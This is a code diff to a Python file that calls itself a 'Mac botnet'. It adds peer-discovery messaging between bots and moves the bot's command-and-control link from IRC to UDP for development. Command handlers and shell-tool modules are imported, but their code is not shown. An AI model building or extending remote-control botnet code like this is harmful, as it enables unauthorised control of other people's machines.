@@ -1,55 +1,64 @@
-import re
-import time
-import signal
-import sys
+"""Mac botnet based on github.com/pirate/python-medusa which runs on the mesh platform"""
+
 import json
 import requests
+import signal
+import sys
+import time
 
 sys.path.append("..")
 
-from programs import BaseProgram
+# Mesh networking components
 from node import Node
 from links import IRCLink, UDPLink
-from routers import MessageRouter
+from programs import RoutedProgram, R
+from protocols import MeshIP, MeshARP
 
+# Bot Modules
 import skype
 import network
 import shell_tools
 import identification
 import communication
 
+from settings import IRC_CONNECTIONS, NICK, VERSION, MAIN_USER, ADMINS
 
-from settings import IRC_CONNECTIONS, VERSION, MAIN_USER, ADMINS
 
-def R(pattern):
-    return re.compile(pattern)
-
-class MacBot(BaseProgram):
-    router = MessageRouter()
+class SwarmBot(RoutedProgram):
+    """handle discovery and communication with other bots"""
+    router = RoutedProgram.router
 
     def __init__(self, node):
+        super(SwarmBot, self).__init__(node)
+        self.friends = {}
+
+    def parse_arp(self, packet):
+        node_info = packet.split('IAM ')[-1]
+        mac_addr, name = node_info.split(';')
+        return mac_addr, name
+
+    @router.route(R('^NEIGHBORS'))
+    def get_neighbors(self, packet, interface):
+        self.send('DISCOVER', interface)
+
+    @router.route(R('^DISCOVER'))
+    def handle_arp_discover(self, packet, interface):
+        self.send('IAM %s;%s' % (self.node.mac_addr, self.node.name), interface)
+
+    @router.route(R('^IAM'))
+    def handle_arp_reply(self, packet, interface):
+        mac_addr, name = self.parse_arp(packet)
+        self.friends[name] = mac_addr
+        self.send('FRIENDS: %s' % self.friends, interface)
+
+
+class MacBot(SwarmBot):
+    """handle bot commands to run on the host machine"""
+    router = SwarmBot.router
+
+    def __init__(self, node):
+        node.name = NICK
         super(MacBot, self).__init__(node)
-        self.router.node = node
-
-    def recv(self, packet, interface):
-        message = packet.decode()
-        self.node.log('\n< [RECV]  %s' % message)
-        self.router.recv(self, message, interface)
-
-    def send(self, message, interface):
-        if not (hasattr(message, '__iter__') and not hasattr(message, '__len__')):
-            # if message is not a list or generator
-            message = [message]
-
-        for line in message:
-            line = line if type(line) in (str, bytes) else '{0}'.format(line)
-            if not line.strip():
-                continue
-
-            self.node.log('\n> [SENT]  %s' % line)
-            packet = bytes(line, 'utf-8') if type(line) is str else line
-            self.node.send(packet, interface)
-
 
     @router.route(R('^!?reload'))
     def reload(self, message, interface):
@@ -137,9 +146,9 @@ class MacBot(BaseProgram):
 
 
 def setup():
-    connections = [IRCLink(**config) for config in IRC_CONNECTIONS]     # production
-    # connections = [UDPLink('en1', 2012)]                              # development
-    node = Node(connections, 'macbot', Program=MacBot)
+    # connections = [IRCLink(**config) for config in IRC_CONNECTIONS]       # production
+    connections = [UDPLink('en1', 2012)]                                    # development
+    node = Node(connections, NICK, Program=MacBot)
 
     [conn.start() for conn in connections]
     node.start()
